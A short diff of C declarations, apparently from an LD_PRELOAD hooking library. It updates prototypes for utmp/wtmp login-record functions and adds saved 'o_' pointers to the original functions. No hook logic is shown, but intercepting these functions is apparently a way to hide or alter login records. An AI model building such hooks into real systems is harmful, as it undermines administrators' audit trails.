@@ -6,15 +6,17 @@ void *dlsym(void *handle, const char *symbol);
 int dlinfo(void *handle, int request, void *p);
 int dladdr(const void *addr, Dl_info *info);
 
-struct utmp *getutent();
-struct utmpx *getutxent();
+struct utmp *getutent(void);
+struct utmpx *getutxent(void);
 struct utmp *getutid(const struct utmp *ut);
 struct utmpx *getutxid(const struct utmpx *utx);
 void getutmp(const struct utmpx *ux, struct utmp *ut);
 void getutmpx(const struct utmp *ut, struct utmpx *utx);
-void login(const struct utmp *ut);
+struct utmp *getutline(const struct utmp *ut);
+struct utmpx *getutxline(const struct utmpx *utx);
 struct utmp *pututline(const struct utmp *ut);
 struct utmpx *pututxline(const struct utmpx *utx);
+void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host);
 void updwtmp(const char *wfile, const struct utmp *ut);
 void updwtmpx(const char *wfilex, const struct utmpx *utx);
 
@@ -101,9 +103,11 @@ typeof(getutid) *o_getutid;
 typeof(getutxid) *o_getutxid;
 typeof(getutmp) *o_getutmp;
 typeof(getutmpx) *o_getutmpx;
-typeof(login) *o_login;
+typeof(getutline) *o_getutline;
+typeof(getutxline) *o_getutxline;
 typeof(pututline) *o_pututline;
 typeof(pututxline) *o_pututxline;
+typeof(logwtmp) *o_logwtmp;
 typeof(updwtmp) *o_updwtmp;
 typeof(updwtmpx) *o_updwtmpx;
 
